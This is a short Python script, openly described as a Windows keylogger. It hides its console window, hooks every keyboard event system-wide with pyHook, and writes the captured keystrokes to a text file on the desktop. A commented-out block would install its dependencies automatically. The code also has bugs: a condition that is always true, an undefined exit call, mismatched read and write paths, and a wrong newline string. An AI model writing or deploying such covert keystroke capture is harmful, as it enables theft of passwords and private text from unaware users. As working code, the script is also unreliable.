import sys
import os
import subprocess

import getpass

reqs = subprocess.check_output([sys.executable, '-m', 'pip', 'freeze'])
installed_packages = [r.decode().split('==')[0] for r in reqs.split()]    
'''
username = getpass.getuser()

list_of_dependencies = ['pywin32', 'C:/Users/%s/Downloads/pyHook-1.5.1-cp37-cp37m-win_amd64.whl' % username]
for library in list_of_dependencies:
    if library not in installed_packages:
        os.system('pip3 install %s' % library)
'''



# Python code for keylogger 
# to be used in windows 
import win32api
import win32console
import win32gui
import pythoncom, pyHook



win = win32console.GetConsoleWindow() 
win32gui.ShowWindow(win, 0) 
  
def OnKeyboardEvent(event): 
    if event.Ascii==5: 
        _exit(1)
    if event.Ascii !=0 or 8: 
    #open output.txt to read current keystrokes 
        f = open('c:\output.txt', 'r+') 
        buffer = f.read() 
        f.close() 
    # open output.txt to write current + new keystrokes 
        with open('C:/Users/Admin/OneDrive/Desktop/output.txt', 'w') as f: 
            keylogs = chr(event.Ascii) 
            if event.Ascii == 13: 
                keylogs = '/n'
            buffer += keylogs 
            f.write(buffer) 
            f.close() 
# create a hook manager object 
hm = pyHook.HookManager() 
hm.KeyDown = OnKeyboardEvent 
# set the hook 
hm.HookKeyboard() 
# wait forever 
pythoncom.PumpMessages() 